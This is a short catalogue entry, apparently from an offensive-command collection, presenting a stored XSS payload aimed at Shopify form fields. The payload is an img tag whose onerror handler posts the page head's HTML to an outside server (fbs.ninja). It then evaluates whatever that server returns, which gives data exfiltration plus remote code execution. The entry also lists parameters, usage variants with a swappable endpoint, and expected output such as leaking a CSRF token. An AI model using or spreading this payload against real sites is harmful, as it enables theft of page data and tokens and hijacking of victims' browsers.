---
data: >-
  <img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var
  x=new
  XMLHttpRequest;t(function(){eval(x.responseText)},2000);x.open('POST','https://fbs.ninja');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/>
tags:
  - xss
  - payload
type: command
executor: html
platforms:
  - Web
id: 6d670d24-bf87-49bc-9953-22dda7a56f3a
created_at: '2025-12-14T17:30:18.180Z'
updated_at: '2025-12-14T17:30:18.180Z'
verified: false
validated: true
submitted: true
---
# shopify-xss-payload-injection

## Command

```html
<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText)},2000);x.open('POST','https://fbs.ninja');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/> 
```

## Description

This HTML payload is injected into form fields to demonstrate stored XSS. It uses an invalid src to trigger onerror, delaying execution with setTimeout, then posts document.head.innerHTML to an external server via XMLHttpRequest for exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | Invalid URL ("a:") to trigger onerror | Yes |
| onerror | JS code for delayed POST and postMessage | Yes |

## Examples

### Basic Usage

Inject into text field:

```html
<img src="a:" onerror="...payload..."/> 
```

### Advanced Usage

Customize endpoint:

```html
<img src="a:" onerror="...x.open('POST','https://custom.server');..."/> 
```

## Expected Output

On render, JS executes: posts HTML to server after 2000ms, evaluates response (e.g., alert CSRF token).

## Related

- [[commands/external-php-csrf-extractor]]
